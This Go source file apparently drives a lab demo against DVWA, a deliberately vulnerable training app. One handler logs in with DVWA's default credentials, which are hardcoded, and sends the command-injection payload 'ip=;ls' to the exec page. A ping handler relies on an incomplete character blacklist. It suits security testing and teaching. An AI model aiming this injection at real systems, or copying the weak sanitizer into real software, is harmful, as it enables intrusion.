package main

import (
	"net/http"
	"os/exec"
	"regexp"
	"strings"

	"github.com/labstack/echo/v4"
)

func registerActions(e *echo.Echo) {
	// ACTION #1 PING
	e.POST("/ping", handlePingAction)

	// ACTION #2 COMMAND INJECTION
	e.POST("/command-injection", handleCommandInjectionAction)
}

func handlePingAction(c echo.Context) error {
	ipFqdn := c.FormValue("ip-fqdn")

	// Sanitize the input to avoid command injection
	if strings.ContainsAny(ipFqdn, ";&|") {
		return c.String(http.StatusBadRequest, "Invalid characters in input")
	}

	// Execute the ping command
	cmd := exec.Command("ping", "-c", "4", ipFqdn)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Return the output of the ping command
	return c.String(http.StatusOK, string(output))
}

func handleCommandInjectionAction(c echo.Context) error {
	username := c.FormValue("username")

	// Map usernames to passwords
	userPassMap := map[string]string{
		"admin":   "password",
		"gordonb": "abc123",
		"1337":    "charley",
		"pablo":   "letmein",
		"smithy":  "password",
	}

	password, ok := userPassMap[username]
	if !ok {
		return c.String(http.StatusBadRequest, "Invalid username")
	}

	// Perform Authentication
	cmd := exec.Command("curl", DVWA_URL+"/login.php",
		"-H", "authority: "+DVWA_HOST,
		"-H", "cache-control: max-age=0",
		"-H", "content-type: application/x-www-form-urlencoded",
		"-H", "origin: "+DVWA_URL,
		"-H", "referer: "+DVWA_URL+"/",
		"-H", "user-agent: "+USER_AGENT,
		"--insecure",
		"--data-raw", "username="+username+"&password="+password+"&Login=Login",
		"-c", "cookie.txt",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Execute Command Injection
	cmd2 := exec.Command("curl", DVWA_URL+"/vulnerabilities/exec/",
		"-H", "authority: "+DVWA_HOST,
		"-H", "cache-control: max-age=0",
		"-H", "content-type: application/x-www-form-urlencoded",
		"-H", "origin: "+DVWA_URL,
		"-H", "referer: "+DVWA_URL+"/index.php",
		"-H", "user-agent: "+USER_AGENT,
		"--insecure",
		"--data-raw", "ip=;ls&Submit=Submit",
		"-b", "cookie.txt",
	)

	output2, err := cmd2.CombinedOutput()
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Extract the content between <h3> tags
	re := regexp.MustCompile("(?s)<h3>(.*?)</h3>")
	matches := re.FindStringSubmatch(string(output2))

	// Return the output of the second curl command
	if len(matches) > 1 {
		return c.String(http.StatusOK, string(output)+"\n"+matches[1])
	} else {
		return c.String(http.StatusOK, string(output)+"\nNo result found")
	}
}
